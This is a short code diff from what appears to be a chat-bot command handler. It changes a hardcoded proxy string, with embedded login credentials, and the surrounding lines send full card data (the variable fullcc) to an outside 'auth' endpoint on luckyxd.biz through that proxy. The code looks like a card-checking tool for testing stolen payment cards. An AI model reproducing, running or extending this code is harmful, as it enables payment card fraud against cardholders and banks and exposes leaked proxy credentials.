@@ -69,7 +69,7 @@ async def cmd_b3(Client, message):
         tic = time.perf_counter()
 
         try:
-            proxy = "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8"
+            proxy = "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t"
             url = f"http://luckyxd.biz:1234/auth?cc={fullcc}&proxy={proxy}"
             res = session.get(url, timeout=50)
             data = res.json()
